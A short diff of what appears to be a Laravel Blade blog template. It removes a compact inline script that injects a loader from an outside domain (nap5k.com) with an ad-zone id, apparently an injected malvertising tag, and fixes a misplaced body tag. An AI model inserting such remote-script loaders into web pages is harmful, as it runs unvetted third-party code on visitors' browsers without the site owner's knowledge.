@@ -6,7 +6,6 @@
         <meta property="og:image" content="{{ asset($Blog_info->Thumbnail_Image) }}">
         <meta property="og:url" content="{{ url()->current() }}">
     @include('frontend.header')
-    <script>(function(s){s.dataset.zone='10908912',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 <body>
 
@@ -206,7 +205,7 @@ h4{
     top: 10px;
 }
 </style>
-<body>
+</body>
 <a href="#main-content" class="skip-link">Skip to main content</a>
 
 <section class="blog-detail">
